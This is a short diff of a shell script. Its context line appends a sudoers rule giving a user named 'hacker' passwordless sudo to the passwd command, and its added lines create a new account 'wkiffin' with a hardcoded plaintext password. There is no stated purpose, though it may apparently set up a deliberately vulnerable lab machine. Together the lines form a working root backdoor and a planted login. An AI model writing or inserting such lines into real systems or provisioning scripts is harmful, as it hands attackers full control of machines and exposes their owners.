@@ -1,1 +1,4 @@
 echo "hacker ALL=(ALL) NOPASSWD: /usr/bin/passwd" >> /etc/sudoers
+
+useradd -m wkiffin
+echo "wkiffin:superstrongpassword" | chpasswd
